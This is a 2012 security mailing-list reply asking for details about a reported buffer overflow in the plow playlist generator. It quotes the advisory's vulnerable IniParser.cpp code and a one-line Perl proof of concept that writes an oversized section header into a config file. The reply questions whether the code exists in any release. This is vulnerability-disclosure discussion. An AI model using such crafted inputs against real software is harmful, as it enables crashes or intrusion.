
Date: Sun, 8 Jul 2012 10:49:02 +0300
From: Henri Salo <henri@...v.fi>
To: pereira@...biz.de, bugtraq@...urityfocus.com, reba@...rs.berlios.de
Subject: Re: plow 0.0.5 <= Buffer Overflow Vulnerability

On Tue, Jul 03, 2012 at 12:11:39PM +0000, pereira@...biz.de wrote:
> #################################################
> plow 0.0.5 <= Buffer Overflow Vulnerability
> #################################################
> 
> Discovered by: Jean Pascal Pereira <pereira@...biz.de>
> 
> Vendor information:
> 
> "plow is a command line playlist generator."
> 
> Vendor URI: http://developer.berlios.de/projects/plow/
> 
> #################################################
> 
> Risk-level: Medium
> 
> The application is prone to a local buffer overflow vulnerability.
> 
> -------------------------------------
> 
> IniParser.cpp, line 26:
> 
> 26:   char buffer[length];
> 27:   char group [length];
> 28:
> 29:   char *option;
> 30:   char *value;
> 31:
> 32:   while(ini.getline(buffer, length)) {
> 33:     if(!strlen(buffer) || buffer[0] == '#') {
> 34:       continue;
> 35:     }
> 36:     if(buffer[0] == '[') {
> 37:       if(buffer[strlen(buffer) - 1] == ']') {
> 38:         sprintf(group, "%s", buffer);
> 39:       } else {
> 40:         err = 1;
> 41:         break;
> 42:       }
> 43:     } 
> 
> -------------------------------------
> 
> Exploit / Proof Of Concept:
> 
> Create a crafted plowrc file:
> 
> perl -e '$x="A"x1096;print("[".$x."]\nA=B")'>plowrc
> 
> -------------------------------------
> 
> Solution: Do some input validation. 

Could you give me more details about this issue thanks. I would like to see commits from Git where this has been added or changed. I am unable to find these lines from the code from older versions (I even tried release packages). Could you also tell me the exact version you used when you tested this issue? Have you reported this to the vendor? Is this fixed in some version? Have you requested CVE-identifier?

- Henri Salo
